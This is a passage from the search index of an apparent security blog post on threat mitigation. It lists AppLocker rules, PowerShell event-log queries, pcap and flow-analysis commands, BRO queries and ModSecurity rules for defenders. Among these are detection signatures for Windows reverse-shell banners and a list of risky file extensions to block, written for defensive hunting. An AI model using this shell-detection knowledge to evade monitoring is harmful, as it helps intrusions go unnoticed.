networks ) 5 . Review all entries with multiple parameters","title":"AutoRuns"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#application-whiteblack-listing","text":"A number of solutions exist to limit the applications a user can use on a system. AppLocker allows you to specify which users or groups can run particular applications in your organization based on unique identities of files. If you use AppLocker, you can create rules to allow or deny applications from running.","title":"Application White/Black listing"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#applocker","text":"","title":"Applocker"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#applocker-executable-path-restrictions","text":"1 2 3 4 5 6 7 8 9 1 . Open Group Policy Management ( gpmc . msc or via MMC Group Policy Object Editor ) 2 . Computer Configuration > Policies > Windows Settings > Security Settings > Application Control Policies > AppLocker 3 . Configure rule enforcement 4 . Executable rules , Check Configured , Enforce rules 5 . Overview > Executable Rules > Right Click Create New Rule 6 . Permissions > Deny > Domain Users 7 . Conditions > Path 8 . Exceptions > Add as / if required 9 . Create > Yes","title":"AppLocker Executable Path Restrictions"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#interesting-paths","text":"1 2 3 4 5 1 . < drive letter > users < username > appdata ( % AppData % or for extension % AppData %* . exe 5 AppData %** . exe ) 2 . users \u0007 ppdatalocal 3 . users \u0007 ppdatalocaltemp 4 . users \u0007 ppdataroaming 5 . programdata","title":"Interesting Paths"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#explicit-whitelisting","text":"1 2 3 4 5 6 7 8 1 . Open Group Policy Management ( gpmc . msc or via MMC Group Policy Object Editor ) 2 . Computer Configuration > Policies > Windows Settings > Security Settings > Software Restriction Policies 3 . Security Level Disallowed 4 . In additional rules allow a . % HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsNTCurrentVersionSystemRoot % b . % HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionProgramFilesDir ( x86 ) % c . % HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionProgramFilesDir % d . * . lnk","title":"Explicit Whitelisting"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#interesting-file-extensions","text":".ade , .adp , .ani , .bas , .bat , .chm , .cmd , .com , .cpl , .crt , .exe , .hlp , .ht , .hta , .inf , .ins , .isp , .jar , .job , .js , .jse , .lnk , .mda , .mdb , .mde , .mdz , .msc , .msi , .msp , .mst , .ocx , .pcd , .ps1 , .reg , .scr , .sct , .shs , .svg , .url , .vb , .vbe , .vbs , .wbk , .wsc , .ws , .wsf , .wsh , .exe , .pif , .pub , .ip References https://technet.microsoft.com/en-us/library/dd759117(v=ws.11).aspx https://technet.microsoft.com/en-us/library/dd759123(v=ws.11).aspx https://technet.microsoft.com/en-us/library/dd759116(v=ws.11).aspx","title":"Interesting file extensions"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#manual-hunting-and-detection-examples","text":"","title":"Manual Hunting and Detection Examples"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#filtering-event-logs-via-powershell","text":"","title":"Filtering Event Logs via PowerShell"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#log-locations-on-disk-only-use-event-viewer-or-cli-to-copy","text":"XP or older: %windir%system32config Vista or newer: %windir%system32winevtlogs","title":"Log locations on disk (only use event viewer or cli to copy)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-times-service-was-installed-all-evtx-files-should-be-system-and-count","text":"Get - WinEvent - FilterHashtable @ { Path = \"*.evtx\" ; ID = 7045 } | Measure - Object - Line","title":"Get times Service was installed (all evtx files, should be system) and count"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-blocked-events","text":"Get - WinEvent - FilterHashtable @ { Path = \"AppLocker.evtx\" ; ID = 8004 } | Format - Table - Wrap","title":"Get blocked events"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-windowsdefender-actions","text":"Get - WinEvent - FilterHashtable @ { Path = \"WindowsDefender.evtx\" ; ID = 1117 } | Format - Table","title":"Get WindowsDefender actions"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-windowsdefender-detections","text":"Get - WinEvent - FilterHashtable @ { Path = \"WindowsDefender.evtx\" ; ID = 1116 } | Format - Table","title":"Get WindowsDefender detections"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-files-by-extension-with-search-from-application-crash","text":"Get-WinEvent -FilterHashtable @ { Path = \"application.evtx\" } |Where { $_.Message - like \"*pdf*\" } |Format-Table -Wrap","title":"Get files (by extension) with search from Application (crash)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-emet-events","text":"Get - WinEvent - FilterHashtable @ { Path = \"Win7-Application.evtx\" ; providername = \"EMET\" } | Format - Table - Wrap","title":"Get EMET events"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-service-installs-and-errors","text":"Get - WinEvent - FilterHashtable @ { Path = \"system.evtx\" ; ID = 7030 , 7045 } | fl","title":"Get service installs and errors"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#search-for-usb-loading","text":"Get-WinEvent -FilterHashtable @ { Path = \"system.evtx\" ; ID = 7045 , 10000 , 10001 , 10100 , 20001 , 20002 , 30003 , 24576 , 24577 , 24579 } |Where { $_.Message - like \"*USB*\" } |fl","title":"Search for USB loading"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#search-for-errorwarninginfo","text":"Get - WinEvent - FilterHashtable @ { Path = \"application.evtx\" ; level = 2 }","title":"Search for error/warning/info"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-remote-eventlog-caution-this-drops-credentials-onto-remote-system","text":"1 2 Get - EventLog - List - ComputerName < ip > Get - EventLog - LogName System - ComputerName","title":"Get remote eventlog (caution this drops credentials onto remote system)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-log-within-x-hours","text":"Get-EventLog System -after (get-date).addhours(-12) | Where { $_.entrytype - eq \"warning\" }","title":"Get log within X hours"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-logs-during-downtime","text":"Get-EventLog -LogName security | ? { $_.EventId - eq 4624 \u2013 and ( $_.TimeGenerated.TimeOfDay - gt '20:00:00' - or $_.TimeGenerated.TimeOfDay - lt '08:00:00' ) } | export-csv offhours.csv","title":"Get logs during \"downtime\""},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#use-wevtutil-to-export-logs-export-log","text":"wevtutil . exe epl system system . evtx","title":"Use wevtutil to export logs (export-log)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#use-wevutil-to-get-last-20-startups-use-rcomputer-for-remote-and-qe-for-short-query","text":"wevutil query - events System / count : 20 / rd : true / format : text / q : \"Event[System[(EventID=12)]]\"","title":"Use wevutil to get last 20 startups (use /r:computer for remote and qe for short query)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#windows-consolidated-logging","text":"enable winrm winrm qc enable wecutil wecutil qc Create subscriptions and select events/filters in event viewer via event viewer or by PowerShell wecutil cs \"Creates a subscription\" wecutil ss \"Sets a subscription\" wecutil es \"Views subscriptions\"","title":"Windows consolidated logging"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-a-detailed-list-of-all-security-auditing-event-entries-use-an-elevated-prompt","text":"wevtutil gp Microsoft - Windows - Security - Auditing / ge / gm : true","title":"Get a detailed list of all security-auditing event entries (use an elevated prompt)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#return-a-list-of-all-security-auditing-categories-and-subcategories-use-an-elevated-prompt","text":"auditpol / list / subcategory : *","title":"Return a list of all security-auditing categories and subcategories (use an elevated prompt)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#network","text":"","title":"Network"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#network-flow-basics","text":"Prevent traffic on uncommon ports (not if a good threat) Establish commonality in traffic (size, frequency, browser headers, etc.) Consistently review outlying DNS entries (very few connections or host traffic) Identify and investigate unique User-Agent strings Identify and investigate Base64 encoded strings within the URL Identify and investigate executables being downloaded and traversing the network","title":"Network Flow Basics:"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#basic-pcap-carving-nix","text":"Note: The snippets below are examples for pcap carving. I'd highly recommend using bro/ for traffic analysis.","title":"Basic PCAP Carving (*nix)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-certificates-from-pcap-use-bro-if-possible","text":"tshark - nr file . pcap - 2 - R \"ssl.handshake.certificate\" - V > cert . txt or ssldump - Nr / path / file . pcap | awk ' BEGIN {c=0;} { if ($0 ~ /^[ ]+Certificate$/) {c=1; print \"========================================\";} if ($0 !~ /^ +/ ) {c=0;} if (c==1) print $0; } '","title":"Get certificates from pcap (use BRO if possible)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#view-certificates-see-bro","text":"openssl x509 - in certsname . der - inform der - text - noout","title":"View certificates (see BRO)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-dns-queries-from-pcap-and-count-instances","text":"tshark - r / path / file . pcap - T fields - e ip . src - e dns . qry . name - 2 - R \"dns.flags.response eq 0\" or tcpdump \u2013 n \u2013 r file . pcap \"port 53\" 2 >/ dev / null | grep \u2013 E 'A?' | awk '{print $(NF-1)}' | sort | uniq \u2013 c | sort \u2013 n","title":"Get DNS queries from pcap and count instances"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-dns-queries-from-nx-domain","text":"tshark - r / path / file . pcap - T fields - e ip . src - e dns . qry . name - 2 - R \"dns.flags.rcode eq 3\"","title":"Get DNS queries from NX domain"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#dns-response-codes","text":"RCODE Name Description 0 NoError No Error 1 FormErr Format Error 2 ServFail Server Failure 3 NXDomain Non-Existent Domain 4 NotImp Not Implemented 5 Refused Query Refused 6 YXDomain Name Exists when it should not 7 YXRRSet RR Set Exists when it should not 8 NXRRSet RR Set that should exist does not 9 NotAuth Server Not Authoritative for zone 9 NotAuth Not Authorized 10 NotZone Name not contained in zone 16 BADVERS Bad OPT Version 16 BADSIG TSIG Signature Failure 17 BADKEY Key not recognized 18 BADTIME Signature out of time window 19 BADMODE Bad TKEY Mode 20 BADNAME Duplicate key name 21 BADALG Algorithm not supported 22 BADTRUNC Bad Truncation 23 BADCOOKIE Bad/missing Server Cookie","title":"DNS Response Codes"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-user-agents-from-pcap","text":"tshark - r / path / file . pcap - T fields - e http . user_agent | sort - n - k1 | uniq - c | sort - n or tcpdump \u2013 n \u2013 A \u2013 r file . pcap 'tcp port 80' | egrep \u2013 I \"User-Agent\" | sort | uniq \u2013 c | sort - n or strings / path / file . pcap | grep - i User - Agent | uniq - c | sort - n","title":"Get User-Agents from pcap"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-info-for-frame-containing-search-dataf","text":"tshark - r / tmp / 10 . 10 . 10 . 52 : 1082 _10 . 10 . 19 . 32 : 80 - 6 . raw - 2 - R 'frame contains \"MZ\"'","title":"Get info for frame containing search dataf"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#search-for-string-in-tcp-data-finds-data-not-in-field-ie-ua-in-json","text":"tshark - r / path / file . pcap - T pdml - T fields - e tcp . data - 2 - R 'tcp contains \"User-Agent\"' | sed s / : // g | xxd - p - r | grep - a User - Agent | uniq - c","title":"Search for string in tcp data (finds data not in field i.e. UA in json)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#find-strings-in-pcap","text":"tshark - r file . pcap - T pdml - T fields - e irc . response - Y 'frame contains \"badguy\"' or tshark - r file . pcap - T pdml - Y 'frame contains \"badguy\"' | grep badguy or ngrep - q - I / path / file . pcap \"badguy\" or strings / path / file . pcap | grep - i User - Agent | sort - u or tshark - r / path / file . pcap - T pdml - 2 - R 'frame contains \"User-Agent\"' | grep User - Agent","title":"Find strings in pcap"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-the-frame-that-contains-string","text":"tshark - r file . pcap - 2 - R ' frame contains \"badguy\"","title":"Get the frame that contains string"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#show-packet-data-by-field","text":"tshark - nr / path / file . pcap - T fields - e http . user_agent - 2 - R http . user_agent","title":"Show packet data by field"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-data-hex-from-first-two-packets-in-pcap","text":"tcpdump - n - r / path / file . pcap - c2 - x - v","title":"Get data &amp; hex from first two packets in pcap"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-frames-that-have-tcp-header-length-gt-20-and-port-25","text":"tshark - r / path / file . pcap - Y 'tcp.hdr_len > 20 && tcp.port == 25'","title":"Get frames that have tcp header length gt 20 and port 25"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-data-in-frames-that-have-tcp-header-length-gt-20-and-port-25","text":"tshark - r / path / file . pcap - T pdml - T fields - e tcp . port - e tcp . hdr_len - Y 'tcp.hdr_len > 20 && tcp.port == 25'","title":"Get data in frames that have tcp header length gt 20 and port 25"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-frames-with-hex-data-0x7932","text":"tshark - r / path / file . pcap - Y 'ip.id == 0x7932'","title":"Get frames with hex data 0x7932"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-frames-and-show-hex-data","text":"tshark - r / path / file . pcap - T pdml - T fields - e ip . id - Y 'ip.id == 0x7932'","title":"Get frames and show hex data"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-all-arp-request-and-count-request1-reply2","text":"tshark - r file . pcap - Y 'arp.opcode == 1' | wc - l","title":"Get all arp request and count (request=1, reply=2)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-iplen-less-than-46-64-for-ethernet-minus-14-header-and-4-trailer-icmp-of-0","text":"tshark - r file . pcap - Y 'ip.len < 46 && icmp.type == 0'","title":"Get ip.len less than 46 (64 for ethernet minus 14 header and 4 trailer) &amp; icmp of 0"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-ip-option-of-loose-src-routing-with-offset-starting-at-ip-options","text":"tshark - r file . pcap - Y 'ip[20] == 0x83 && ip.hdr_len >20'","title":"Get ip option of loose src routing with offset starting at ip options"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#filter-info","text":"1 2 3 4 5 6 7 URG = 32 or 0 x20 ACK = 16 or 0 x10 PSH = 8 or 0 x08 RST = 4 or 0 x04 SYN = 2 or 0 x02 FIN = 1 or 0 x01 All = 0 xFF Examples: 'tcp[13] & 2 !=0' Get all SYN 'tcp[13] & 4 !=0' Get all RST 'tcp[13] & 16 !=0' Get all ACK","title":"Filter Info"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-frame-with-ip-src-and-ack-flag-set","text":"tshark - n - r / path / file . pcap '((ip.src == 192.168.10.1) and (tcp.flags.ack==1))' or tshark - n - r / path / file . pcap 'tcp[13] == 0x10 && ip.src == 192.168.10.1' or tcpdump - n - r / path / file . pcap 'src host 192.168.10.1 and tcp[13] = 0x10'","title":"Get frame with IP src and ACK flag set"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-frame-with-ip-src-and-ack-or-rst-flag-set","text":"tshark - n - r / path / file . pcap '((ip.src == 192.168.10.1) and (tcp.flags.syn==1 or tcp.flags.reset==1))' or tshark - n - r / path / file . pcap 'ip.src == 192.168.10.1 && tcp[13] == 0x14 or tcp[13] == 0x10 or tcp[13] == 0x04' or tcpdump - n - r / path / file . pcap 'src host 192.168.10.1 and tcp[13] & 0x14 !=0'","title":"Get frame with IP src and ACK or RST flag set"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-frame-with-dst-port-0-and-df-flag-set","text":"tshark - n - r / path / file . pcap 'tcp.port == 0 && ip[6] == 0x40'","title":"Get frame with dst port 0 and DF flag set"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-frame-with-net-1010101024","text":"tcpdump - n - r / path / file . pcap 'dst net 10.10.10 and ip[19] & 0xd0 = 0xd0'","title":"Get frame with net 10.10.10.10/24"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-frames-by-ip","text":"tshark - n - r file . pcap '((ip.addr == 10.10.10.10) and (ip.addr == 192.168.10.11))'","title":"Get frames by ip"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#view-specific-frame-verbose-note-tcp-stream-index-number","text":"tshark - n - r file . pcap - Y frame . number == 12 - V","title":"View specific frame verbose (note tcp stream index number)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#follow-tcp-stream-0-ascii-raw-hex","text":"tshark - n - r file . pcap - z \"follow,tcp,ascii,0\"","title":"Follow tcp stream 0 (ascii, raw, hex)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#flow-data-analysis","text":"","title":"Flow Data Analysis"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#use-rwfilter-to-analyze-flow-data-by-ip-and-port","text":"rwfilter suspicious . silk --any-address=192.168.10.10 --aport=1088 --print-stat","title":"Use rwfilter to analyze flow data by IP and port"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#view-detail-of-flow-data-by-ip-and-port","text":"rwfilter suspicious . silk --any-address=192.168.10.10 --aport=1088 --pass=stdout|rwcut","title":"View detail of flow data by IP and port"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#extract-all-udp-from-flow-then-pipe-to-get-field-4-4dst-port-3srcport-5proto-6packets-etc","text":"rwfilter suspicious . silk --proto=17 --pass=stdout|rwuniq --fields=4","title":"Extract all UDP from flow then pipe to get field 4 (4=dst port, 3=srcport, 5=proto, 6=packets, etc)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#extract-connections-from-108-with-a-reset-to-close-then-pipe-to-get-srcip-count","text":"rwfilter suspicious . silk --any-address=10.10.0.0/16 --flags-all=R/R --pass=stdout|rwuniq --fields=1","title":"Extract connections from 10/8 with a reset to close then pipe to get srcIP count"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#use-rwstats-to-get-flow-data-of-top-5-flows","text":"rwstats suspicious . silk --fields sIP --bytes --count=5","title":"Use rwstats to get flow data of top 5 flows"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#extract-records-not-icmp-tcp-or-udp-note-fail-and-have-src-ip-of-1010101","text":"rwfilter suspicious . silk --proto=1,6,17 --fail=stdout|rwfilter --input-pipe=stdin --saddress=10.10.10.1 --pass=stdout | rwcut or rwfilter suspicious . silk --proto=0,2-5,7-16,18- --saddress=10.10.10.1 --pass=stdout | rwcut","title":"Extract records not ICMP, TCP or UDP (note fail) and have src IP of 10.10.10.1"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-top-5-ip-with-data-transfer","text":"rwstats phishing - attack . silk --fields=sip --top --bytes --count 5","title":"Get top 5 IP with data transfer"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-flows-with-larger-than-100000-bytes","text":"rwfilter phishing - attack . silk --proto=6 --bytes=100000- --pass=stdout |rwcut -f 1-8","title":"Get flows with larger than 100,000 bytes"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#elsa-bro-queries","text":"","title":"ELSA (BRO queries)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#elsa-most-common-svc","text":"class = BRO_CONN groupby:service","title":"ELSA most common svc"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#elsa-bro-nx-domains","text":"class = BRO_DNS nxdomain groupby:hostname","title":"ELSA BRO nx domains"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#elsa-bro-common-fqdn","text":"class = BRO_HTTP \"-\" groupby:site","title":"ELSA BRO common FQDN"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#elsa-bro-sites-hosting-exe","text":"class = BRO_HTTP BRO_HTTP . mime_type = \"x-dosexec\" groupby:site","title":"ELSA BRO Sites hosting EXE"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#elsa-bro-uri-with-exe-downloads","text":"class = BRO_HTTP BRO_HTTP . mime_type = \"x-dosexec\" groupby:BRO_HTTP . uri","title":"ELSA BRO URI with EXE downloads"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#elsa-bro-internal-ip-exe-download","text":"class = BRO_FILES \"-\" mime_type = \"application/x-dosexec\" groupby:rx_hosts","title":"ELSA BRO Internal IP EXE download"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#elsa-bro-connections-wo-ua-group-by-source-ip","text":"class = BRO_HTTP \"-\" user_agent = \"-\" groupby:srcipt","title":"ELSA BRO connections w/o UA group by source IP"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#bro","text":"","title":"BRO"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#bro-logs","text":"Just a few logs that can be used to gather information. Note, custom logs can be created and referenced using the BRO.","title":"BRO Logs"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#bro-log-hunting","text":"BRO log Description conn.log IP/protocol connections conn-summary.log Statistics/summarizes activity known_hosts.log New hosts within past hour known_serices.log New services within past hour dpd.log Dynamic protocol detection weird.log Anomalous activity loaded_scripts.log Scripts loaded on start reporter.log Severity of issues with bro software.log Determines version of detected protocol various protocols (http,dns,ssl,etc) Activity log per protocol","title":"BRO Log Hunting"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#bro-protocol-logs","text":"BRO log Description conn.log TCP/UDP/ICMP connections dce_rpc.log Distributed Computing Environment/RPC dhcp.log DHCP leases dnp3.log DNP3 requests and replies dns.log DNS activity ftp.log FTP activity http.log HTTP requests and replies irc.log IRC commands and responses kerberos.log Kerberos modbus.log Modbus commands and responses modbus_register_change.log Tracks changes to Modbus holding registers mysql.log MySQL ntlm.log NT LAN Manager (NTLM) radius.log RADIUS authentication attempts rdp.log RDP RDP rfb.log Remote Framebuffer (RFB) sip.log SIP smb_cmd.log SMB commands smb_files.log SMB files smb_mapping.log SMB trees smtp.log SMTP transactions snmp.log SNMP messages socks.log SOCKS proxy requests ssh.log SSH connections ssl.log SSL/TLS handshake info syslog.log Syslog messages tunnel.log Tunneling protocol events BRO Log Reference \u2013 https://www.bro.org/sphinx-git/script-reference/log-files.html","title":"BRO Protocol Logs"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#bro-carving","text":"","title":"BRO Carving"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#read-and-output-bro-logs","text":"bro - r file . pcap","title":"Read and output bro logs"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-source-src-ip-dst-ip-dst-port-and-bytes-in-that-order","text":"cat conn . log | bro - cut id . orig_h id . resp_h id . resp_p orig_bytes | head - 2","title":"Get source src ip, dst ip, dst port, and bytes (in that order)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#same-as-above-but-sort-by-bytes-field-5-reverse-by-number","text":"cat conn . log | bro - cut id . orig_h id . orig_p id . resp_h id . resp_p orig_bytes | sort - k 5 - rn","title":"Same as above but sort by bytes (field 5 reverse by number)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-http-on-non-standard-ports-ssl","text":"cat conn . log | bro - cut service id . resp_p id . resp_h | awk '$1 == \"http\" && ! ($2 == 80 || $2 == 8080) { print $3 }' | sort - u","title":"Get http on non-standard ports (ssl?)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#extract-dns-info-from-bro-logs","text":"cat dns . log | bro - cut query | sort - u and cat dns . log | bro - cut - d answers | sort - u","title":"Extract DNS info from bro logs"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-user-agents","text":"cat http . log | bro - cut user_agent | sort | uniq - c | sort - n","title":"Get User-Agents"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-mime-types","text":"cat http . log | bro - cut orig_mime_type | sort | uniq - c | sort - n","title":"Get Mime Types"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-bro-outbound-signature-stored-in-sig-file-read-with-s","text":"1 2 3 4 5 6 7 8 signature outbound - sig { ip - proto == tcp src - ip == 192 . 168 . 0 . 0 / 16 dst - ip != 192 . 168 . 0 . 0 / 16 dst - port == 80 http - request - header /^ User - Agent :. */ event \"Outbound HTTP traffic\" }","title":"Get bro outbound signature stored in .sig file (read with -s)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#get-bro-windows-shell-signature-stored-in-sig-file-read-with-s","text":"1 2 3 4 5 6 signature windows_reverse_shell { ip - proto == tcp tcp - state established , originator event \"ATTACK-RESPONSES Microsoft cmd.exe banner (reverse-shell originator)\" payload / . * Microsoft Windows . * x28Cx29 Copyright 1985 - . * Microsoft Corp / } 1 2 3 4 5 6 signature windows_shell { ip - proto == tcp tcp - state established , responder event \"ATTACK-RESPONSES Microsoft cmd.exe banner (normal-shell responder)\" payload / . * Microsoft Windows . * x28Cx29 Copyright 1985 - . * Microsoft Corp / }","title":"Get bro Windows Shell signature stored in .sig file (read with -s)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#run-bro-with-sig-file","text":"1 bro - r file . pcap - s outbound . sig","title":"Run bro with sig file"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#view-dst-addresses-in-signature-file","text":"cat signatures . log | bro - cut dst_addr | sort | uniq - c | sort - n","title":"View dst addresses in signature file"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#bro-event-script-to-find-user-agent-outboundbro","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 event http_header ( c : connection , is_orig : bool , name : string , value : string ) { local snet = 192 . 168 . 0 . 0 / 16 ; if ( c $ id $ orig_h in snet ) { if ( c $ id $ resp_h ! in snet ) { if ( c $ id $ resp_p == 80 / tcp && name == \" USER-AGENT \" ) { print fmt ( \" source IP %s, destination IP/port %s %s, USER-AGENT content %s \" , c $ id $ orig_h , c $ id $ resp_h , c $ id $ resp_p , value ) ; } } } } BRO Scripting Reference \u2013 https://www.bro.org/sphinx/scripting/","title":"BRO event script to find User-Agent (outbound.bro)"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#run-event-file-to-view-user-agent","text":"bro - r file . pcap outbound - event . bro","title":"Run event file to view user-agent"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#bro-extract-common-files-from-pcap","text":"sudo bro - r file . pcap / opt / bro / share / bro / file - extraction / extract . bro","title":"BRO extract common files from pcap"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#extract-ssl-info","text":"cat ssl . log | bro - cut server_name , subject , issuer_subject","title":"Extract ssl info"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#bro-extract-unique-ssl-certificate-data","text":"bro - C - r file . pcap > cert_data . txt","title":"BRO extract unique SSL certificate data"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#bro-extract-ssl-issuer-data-from-certificate-extraction","text":"cat ssl . log | bro - cut issuer_subject | sort - u > / tmp / bro / data . txt","title":"BRO extract SSL issuer data from certificate extraction"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#bro-show-shortest-issuer-from-extraction","text":"cat / tmp / bro / data . txt | awk '{print length, $0}' | sort - nr","title":"BRO show shortest issuer from extraction"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#modsecurity-rules","text":"","title":"ModSecurity rules"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#errorlog-ua-not-starting-with-mozilla","text":"SecRule REQUEST_HEADERS : User - Agent \"!^Mozilla/d.d\" \"log,msg:'User-Agent without Mozilla/#.#'\"","title":"error.log UA not starting with Mozilla"},{"location":"blogs/2018/threat-mitigation-strategies-technical-recommendations-and-info-part-2/#errorlog-visiting-ip-url","text":"SecRule REQUEST_HEADERS : Host 